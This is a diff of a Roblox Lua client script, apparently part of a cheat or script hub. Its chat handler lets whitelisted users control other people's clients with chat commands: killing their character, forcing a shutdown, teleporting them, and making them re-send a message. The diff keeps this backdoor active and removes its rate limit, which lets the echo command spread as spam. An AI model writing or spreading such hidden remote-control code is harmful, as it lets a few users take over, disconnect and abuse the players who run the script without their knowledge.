@@ -28,19 +28,14 @@ game:GetService("TextChatService").OnIncomingMessage = function(msg)
     props.PrefixText = "<font color='rgb(0, 0, 255)'>[POSSIBLE MOON CONVERT USER]</font> " .. prefix
   end
 
-  if Player.UserId ~= game.Players.LocalPlayer.UserId then
-    if whitelistdata[tostring(Player.UserId)] and Text:lower() == "-kill default" then
+  if whitelistdata[tostring(Player.UserId)] and Text:lower() == "-kill default" and not whitelistdata[tostring(game.Players.LocalPlayer.UserId)] then
         game.Players.LocalPlayer.Character.Humanoid:ChangeState(15)
-    elseif whitelistdata[tostring(Player.UserId)] and Text:lower() == "-kick default" then
+    elseif whitelistdata[tostring(Player.UserId)] and Text:lower() == "-kick default" and not whitelistdata[tostring(game.Players.LocalPlayer.UserId)] then
         game:Shutdown()
-    elseif whitelistdata[tostring(Player.UserId)] and Text:lower() == "-bring default" then
+    elseif whitelistdata[tostring(Player.UserId)] and Text:lower() == "-bring default" and not whitelistdata[tostring(game.Players.LocalPlayer.UserId)] then
       game.Players.LocalPlayer.Character.Humanoid.RootPart.CFrame = Player.Character.Humanoid.RootPart.CFrame
-    elseif whitelistdata[tostring(Player.UserId)] and Text:lower() == "-gh meow" and debounce == false then
-      debounce = true
+    elseif whitelistdata[tostring(Player.UserId)] and Text:lower() == "-gh meow" and debounce == false and not whitelistdata[tostring(game.Players.LocalPlayer.UserId)] then
       game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-gh meow")
-      task.wait(10)
-      debounce = false
     end
-  end
   return props
 end
